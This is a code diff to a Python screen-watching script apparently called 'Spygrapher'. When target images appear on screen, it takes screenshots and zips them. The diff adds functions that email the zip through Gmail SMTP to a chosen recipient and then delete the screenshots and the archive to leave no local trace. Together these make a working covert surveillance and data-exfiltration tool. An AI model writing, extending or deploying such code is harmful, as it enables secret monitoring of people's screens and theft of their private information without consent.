@@ -1,10 +1,11 @@
 import time, os
 import pyautogui, pyscreeze
 import zipfile
-
-''' Thing to do in order of importance'''
-
-#TODO implement email attachments
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 
 class Directories(object):
 	__slots__ = ['current' ,'find', 'screenshots', 'compressed']
@@ -19,10 +20,48 @@ def getCurrentDateTime():
 	formatted_time = time.strftime('%Y%m%d-%H%M%S', current_date_time)
 	return formatted_time
 
-def deleteImages():
-	for file in os.listdir(dir.screenshots):
-		if file.endswith('.png'):
-			os.remove(os.path.join(dir.screenshots, file))
+def sendMail(zip_name, user_email, user_password, receiving_email):
+	email_from = user_email
+	email_password = user_password
+	email_to = receiving_email
+
+	subject = 'Spygrapher - ' + getCurrentDateTime()
+
+	mail = MIMEMultipart() # Creating the mail object
+	mail['From'] = email_from
+	mail['To'] = email_to
+	mail['Subject'] = subject
+
+	body = 'Spygrapher reporting!'
+	mail.attach(MIMEText(body,'plain')) # Attaching body text to mail object
+
+	file_dir = os.path.join(dir.compressed, zip_name) # Loading file
+	attachment = open(file_dir, 'rb') # Reading file
+
+	att = MIMEBase('application', 'octet-stream') # Creating encoder object
+	att.set_payload(attachment.read()) # Attaching file to the encoder
+	encoders.encode_base64(att) # Setting the encoder to base 64
+	att.add_header('Content-Disposition', "attachment; filename = " + file_dir) # Adding headers
+
+	mail.attach(att) # Attaching encoder with file to mail
+	text = mail.as_string() # Getting the text content from the mail as a string
+	server = smtplib.SMTP('smtp.gmail.com', 587) # Initializing gmail server connection (if you're not using gmail then search your mail's provider smtp server and port)
+	server.starttls() # Starting secure connection
+	server.login(email_from, email_password) # Logging into your email
+
+	server.sendmail(email_from, email_to, text) # Sending mail
+	attachment.close() # Closing file
+	server.quit() # Closing server connection
+
+def deleteFrom(folder):
+	if folder == 'screenshots':
+		for file in os.listdir(dir.screenshots):
+			if file.endswith('.png'):
+				os.remove(os.path.join(dir.screenshots, file))
+	elif folder == 'compressed':
+		for file in os.listdir(dir.compressed):
+			if file.endswith('.zip'):
+				os.remove(os.path.join(dir.compressed, file))
 
 def createZip():
 	date_time = getCurrentDateTime()
@@ -32,6 +71,7 @@ def createZip():
 		if file.endswith('.png'):
 			zip_file.write(os.path.join(dir.screenshots, file))
 	zip_file.close()
+	return zip_name
 
 def takeScreenshots(amount, interval):
 	for i in range(0, amount):
@@ -52,12 +92,19 @@ def checkFolders():
 		elif not os.path.exists(dir.compressed):
 			os.mkdir('compressed')
 
+### MAIN ###
+
 if __name__ == '__main__':
+
+	# USER
+	amount, interval = 10, 3 # takeScreenshots arguments
+	user_email = 'your_email@gmail.com' # Your email
+	user_password = 'your_password' # Your email's password
+	receiving_email = 'receiving_email@gmail.com' # You can use the same email as email_from to receive the mails yourself
 
 	dir = Directories()
 	i = 0
 	find_images = []
-	amount, interval = 10, 3 # takeScreenshots arguments
 
 	checkFolders()
 
@@ -75,9 +122,14 @@ if __name__ == '__main__':
 			print('Taking screenshots, this process will take ' + str(amount*interval) + ' seconds')
 			takeScreenshots(amount, interval)
 			print('Creating compressed file')
-			createZip()
+			zip_name = createZip()
 			print('Deleting screenshots')
-			deleteImages()
+			deleteFrom('screenshots')
+			print('Sending Email...')
+			sendMail(zip_name, user_email, user_password, receiving_email)
+			print('Deleting compressed file')
+			deleteFrom('compressed')
+			print('Done!')
 			print('\nSearching...\n')
 		except pyscreeze.ImageNotFoundException:
 			time.sleep(1)
@@ -88,5 +140,10 @@ if __name__ == '__main__':
 			while len(find_images) == 0:
 				time.sleep(2)
 				find_images = checkFindImages()
-			print('\n' + str(len(checkFindImages())) + ' image/s found!\n')
+			print('\n' + str(len(find_images)) + ' image/s found!\n')
 			print('Searching...\n')
+		except OSError:
+			print('Error (on find folder): The software does not have permission to load the image or it has an unsupported name.')
+			print('Accents are not supported.\n')
+			time.sleep(2)
+			break
